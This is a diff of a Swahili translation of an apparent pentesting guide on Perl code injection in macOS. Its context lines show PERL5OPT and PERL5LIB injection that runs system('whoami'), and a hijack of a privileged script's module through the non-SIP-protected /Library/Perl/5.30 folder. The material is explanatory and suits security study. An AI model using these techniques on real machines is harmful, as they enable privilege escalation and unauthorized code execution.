@@ -15,14 +15,14 @@ Sasa **export the env variable** na uendeleze **perl** script:
 export PERL5OPT='-Mwarnings;system("whoami")'
 perl test.pl # This will execute "whoami"
 ```
-Chaguo lingine ni kuunda moduli ya Perl (kwa mfano, `/tmp/pmod.pm`):
+Chaguo lingine ni kuunda moduli ya Perl (mfano `/tmp/pmod.pm`):
 ```perl:/tmp/pmod.pm
 #!/usr/bin/perl
 package pmod;
 system('whoami');
 1; # Modules must return a true value
 ```
-Na kisha tumia mabadiliko ya mazingira:
+Na kisha tumia mabadiliko ya env:
 ```bash
 PERL5LIB=/tmp/ PERL5OPT=-Mpmod
 ```
@@ -44,14 +44,14 @@ Ambayo itarudisha kitu kama:
 /System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
 /System/Library/Perl/Extras/5.30
 ```
-Baadhi ya folda zilizorejeshwa hata hazipo, hata hivyo, **`/Library/Perl/5.30`** inapatikana **na** **siyo** **ililindwa** na **SIP** na iko **kabla** ya folda **zilizolindwa na SIP**. Hivyo, mtu anaweza kutumia folda hiyo kuongeza utegemezi wa skripti ndani yake ili skripti ya Perl yenye haki za juu iweze kuipakia.
+Baadhi ya folda zilizorejeshwa hata hazipo, hata hivyo, **`/Library/Perl/5.30`** inapatikana **na** **sio** **ililindwa** na **SIP** na iko **kabla** ya folda **zilizolindwa na SIP**. Hivyo, mtu anaweza kutumia folda hiyo kuongeza utegemezi wa skripti ili skripti ya Perl yenye haki za juu iweze kuipakia.
 
 > [!WARNING]
-> Hata hivyo, kumbuka kuwa **unahitaji kuwa root kuandika katika folda hiyo** na siku hizi utapata **kiashiria cha TCC**:
+> Hata hivyo, kumbuka kuwa **unahitaji kuwa root ili kuandika katika folda hiyo** na siku hizi utapata **kipeperushi cha TCC**:
 
 <figure><img src="../../../images/image (28).png" alt="" width="244"><figcaption></figcaption></figure>
 
-Kwa mfano, ikiwa skripti inatumia **`use File::Basename;`** itakuwa inawezekana kuunda `/Library/Perl/5.30/File/Basename.pm` ili kufanya itekeleze msimbo wa kiholela.
+Kwa mfano, ikiwa skripti inatumia **`use File::Basename;`** itakuwa inawezekana kuunda `/Library/Perl/5.30/File/Basename.pm` ili kufanya itekeleze msimbo usio na mipaka.
 
 ## References
 
